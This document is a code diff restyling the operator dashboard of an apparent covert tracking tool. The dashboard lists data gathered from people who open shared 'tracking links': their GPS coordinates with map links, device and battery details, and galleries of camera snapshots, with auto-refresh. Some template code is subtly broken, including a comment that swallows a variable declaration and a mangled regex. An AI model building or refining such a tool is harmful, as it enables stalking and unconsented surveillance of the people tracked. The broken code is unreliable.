@@ -7,6 +7,99 @@
     <title>Dashboard - <%= userId %>
     </title>
     <link rel="stylesheet" href="/css/style.css">
+    <style>
+        .snapshot-gallery {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+            gap: 12px;
+            margin-top: 12px;
+        }
+
+        .snapshot-item {
+            position: relative;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            transition: transform 0.3s ease;
+        }
+
+        .snapshot-item:hover {
+            transform: scale(1.05);
+        }
+
+        .snapshot-item img {
+            width: 100%;
+            height: 180px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .snapshot-label {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: linear-gradient(to top, rgba(0, 0, 0, 0.7), transparent);
+            color: white;
+            padding: 8px;
+            font-size: 12px;
+            font-weight: 600;
+        }
+
+        .battery-indicator {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            padding: 6px 12px;
+            background: #f0fdf4;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+        }
+
+        .battery-icon {
+            width: 24px;
+            height: 12px;
+            border: 2px solid #10b981;
+            border-radius: 2px;
+            position: relative;
+        }
+
+        .battery-icon::after {
+            content: '';
+            position: absolute;
+            right: -4px;
+            top: 2px;
+            width: 2px;
+            height: 4px;
+            background: #10b981;
+        }
+
+        .battery-fill {
+            height: 100%;
+            background: #10b981;
+            transition: width 0.3s ease;
+        }
+
+        .map-link {
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 16px;
+            background: #3b82f6;
+            color: white;
+            text-decoration: none;
+            border-radius: 6px;
+            font-size: 14px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .map-link:hover {
+            background: #2563eb;
+            transform: translateY(-2px);
+        }
+    </style>
 </head>
 
 <body>
@@ -15,65 +108,8 @@
             <h1>📊 Dashboard</h1>
             <p class="subtitle">User ID: <%= userId %>
             </p>
-            <a href="/" class="btn btn-secondary">← Back to Home</a>
+            <a href="/" class="btn btn-secondary" style="margin-top: 16px;">← Back to Home</a>
         </header>
-
-        <div class="card">
-            <div class="card-header">
-                <h2>Collected Data (<%= data.length %> entries)</h2>
-            </div>
-            <div class="card-body">
-                <% if (data.length===0) { %>
-                    <div class="empty-state">
-                        <p>No data collected yet. Share your tracking links to start collecting information.</p>
-                    </div>
-                    <% } else { %>
-                        <div class="data-list">
-                            <% data.reverse().forEach((entry, index)=> { %>
-                                <div class="data-entry">
-                                    <div class="data-header">
-                                        <span class="timestamp">
-                                            <%= new Date(entry.timestamp).toLocaleString() %>
-                                        </span>
-                                        <span class="badge <%= entry.data.type %>">
-                                            <%= entry.data.type %>
-                                        </span>
-                                    </div>
-                                    <div class="data-content">
-                                        <% if (entry.data.type==='location' ) { %>
-                                            <div class="location-data">
-                                                <p><strong>Latitude:</strong>
-                                                    <%= entry.data.latitude %>
-                                                </p>
-                                                <p><strong>Longitude:</strong>
-                                                    <%= entry.data.longitude %>
-                                                </p>
-                                                <p><strong>Accuracy:</strong>
-                                                    <%= entry.data.accuracy %> meters
-                                                </p>
-                                                <a href="https://www.google.com/maps?q=<%= entry.data.latitude %>,<%= entry.data.longitude %>"
-                                                    target="_blank" class="btn btn-sm">
-                                                    View on Map
-                                                </a>
-                                            </div>
-                                            <% } else if (entry.data.type==='info' ) { %>
-                                                <pre class="info-data"><%= entry.data.content %></pre>
-                                                <% } else if (entry.data.type==='camsnap' ) { %>
-                                                    <div class="camsnap-data">
-                                                        <p><strong>Camera Snapshot:</strong>
-                                                            <%= entry.data.filename %>
-                                                        </p>
-                                                        <img src="/data/<%= entry.data.filename %>"
-                                                            alt="Camera snapshot" class="snapshot-img">
-                                                    </div>
-                                                    <% } %>
-                                    </div>
-                                </div>
-                                <% }) %>
-                        </div>
-                        <% } %>
-            </div>
-        </div>
 
         <div class="stats-card">
             <h3>📈 Statistics</h3>
@@ -104,13 +140,168 @@
                 </div>
             </div>
         </div>
+
+        <div class="card">
+            <div class="card-header">
+                <h2>Collected Data (<%= data.length %> entries)</h2>
+            </div>
+            <div class="card-body">
+                <% if (data.length===0) { %>
+                    <div class="empty-state">
+                        <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+                                d="M20 13V6a2 2 0 00-2-2H6a2 2 0 00-2 2v7m16 0v5a2 2 0 01-2 2H6a2 2 0 01-2-2v-5m16 0h-2.586a1 1 0 00-.707.293l-2.414 2.414a1 1 0 01-.707.293h-3.172a1 1 0 01-.707-.293l-2.414-2.414A1 1 0 006.586 13H4" />
+                        </svg>
+                        <p>No data collected yet. Share your tracking links to start collecting information.</p>
+                    </div>
+                    <% } else { %>
+                        <div class="data-list">
+                            <% // Group camera snapshots by timestamp (within 10 seconds) const groupedData=[]; const
+                                snapshots={}; data.forEach(entry=> {
+                                if (entry.data.type === 'camsnap') {
+                                const baseTime = Math.floor(new Date(entry.timestamp).getTime() / 10000);
+                                if (!snapshots[baseTime]) {
+                                snapshots[baseTime] = {
+                                timestamp: entry.timestamp,
+                                data: { type: 'camsnap', images: [] }
+                                };
+                                }
+                                snapshots[baseTime].data.images.push(entry.data);
+                                } else {
+                                groupedData.push(entry);
+                                }
+                                });
+
+                                // Add grouped snapshots
+                                Object.values(snapshots).forEach(snap => groupedData.push(snap));
+
+                                // Sort by timestamp
+                                groupedData.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
+                                %>
+
+                                <% groupedData.forEach((entry, index)=> { %>
+                                    <div class="data-entry">
+                                        <div class="data-header">
+                                            <span class="timestamp">
+                                                <%= new Date(entry.timestamp).toLocaleString('en-US', { year: 'numeric'
+                                                    , month: 'short' , day: 'numeric' , hour: '2-digit' ,
+                                                    minute: '2-digit' , second: '2-digit' }) %>
+                                            </span>
+                                            <span class="badge <%= entry.data.type %>">
+                                                <% if (entry.data.type==='location' ) { %>📍 Location
+                                                    <% } else if (entry.data.type==='info' ) { %>ℹ️ Info
+                                                        <% } else if (entry.data.type==='camsnap' ) { %>📸 Snapshots
+                                                            <% } %>
+                                            </span>
+                                        </div>
+
+                                        <div class="data-content">
+                                            <% if (entry.data.type==='location' ) { %>
+                                                <div class="data-grid">
+                                                    <div class="data-item">
+                                                        <strong>Latitude</strong>
+                                                        <span>
+                                                            <%= entry.data.latitude %>
+                                                        </span>
+                                                    </div>
+                                                    <div class="data-item">
+                                                        <strong>Longitude</strong>
+                                                        <span>
+                                                            <%= entry.data.longitude %>
+                                                        </span>
+                                                    </div>
+                                                    <div class="data-item">
+                                                        <strong>Accuracy</strong>
+                                                        <span>
+                                                            <%= entry.data.accuracy %> meters
+                                                        </span>
+                                                    </div>
+                                                </div>
+                                                <div style="margin-top: 16px;">
+                                                    <a href="https://www.google.com/maps?q=<%= entry.data.latitude %>,<%= entry.data.longitude %>"
+                                                        target="_blank" class="map-link">
+                                                        🗺️ View on Google Maps
+                                                    </a>
+                                                </div>
+
+                                                <% } else if (entry.data.type==='info' ) { %>
+                                                    <% const content=entry.data.content; const
+                                                        lines=content.split('\n'); const
+                                                        isBattery=content.includes('Battery Status'); %>
+
+                                                        <% if (isBattery) { %>
+                                                            <h4 style="margin-bottom: 12px; color: #10b981;">🔋 Battery
+                                                                Information</h4>
+                                                            <div class="data-grid">
+                                                                <% lines.forEach(line=> {
+                                                                    const match = line.match(/<b>(.+?):<\ /b>\s*(.+)/);
+                                                                            if (match && match[1] !== 'Battery Status')
+                                                                            { %>
+                                                                            <div class="data-item">
+                                                                                <strong>
+                                                                                    <%= match[1] %>
+                                                                                </strong>
+                                                                                <span>
+                                                                                    <%= match[2] %>
+                                                                                </span>
+                                                                            </div>
+                                                                            <% } }) %>
+                                                            </div>
+                                                            <% } else { %>
+                                                                <h4 style="margin-bottom: 12px; color: #3b82f6;">💻
+                                                                    System Information</h4>
+                                                                <div class="data-grid">
+                                                                    <% lines.forEach(line=> {
+                                                                        const match = line.match(/<b>(.+?):<\ /b>
+                                                                                \s*(.+)/);
+                                                                                if (match) { %>
+                                                                                <div class="data-item">
+                                                                                    <strong>
+                                                                                        <%= match[1] %>
+                                                                                    </strong>
+                                                                                    <span>
+                                                                                        <%= match[2] %>
+                                                                                    </span>
+                                                                                </div>
+                                                                                <% } }) %>
+                                                                </div>
+                                                                <% } %>
+
+                                                                    <% } else if (entry.data.type==='camsnap' &&
+                                                                        entry.data.images) { %>
+                                                                        <h4
+                                                                            style="margin-bottom: 12px; color: #ec4899;">
+                                                                            📸 Camera Snapshots (<%=
+                                                                                entry.data.images.length %>)</h4>
+                                                                        <div class="snapshot-gallery">
+                                                                            <% entry.data.images.forEach((img, idx)=> {
+                                                                                %>
+                                                                                <div class="snapshot-item">
+                                                                                    <img src="/data/<%= img.filename %>"
+                                                                                        alt="Snapshot <%= img.index || idx + 1 %>"
+                                                                                        onclick="window.open('/data/<%= img.filename %>', '_blank')">
+                                                                                    <div class="snapshot-label">
+                                                                                        Photo #<%= img.index || idx + 1
+                                                                                            %>
+                                                                                    </div>
+                                                                                </div>
+                                                                                <% }) %>
+                                                                        </div>
+                                                                        <% } %>
+                                        </div>
+                                    </div>
+                                    <% }) %>
+                        </div>
+                        <% } %>
+            </div>
+        </div>
     </div>
 
     <script>
-        // Auto-refresh every 10 seconds
+        // Auto-refresh every 15 seconds
         setTimeout(() => {
             location.reload();
-        }, 10000);
+        }, 15000);
     </script>
 </body>
 
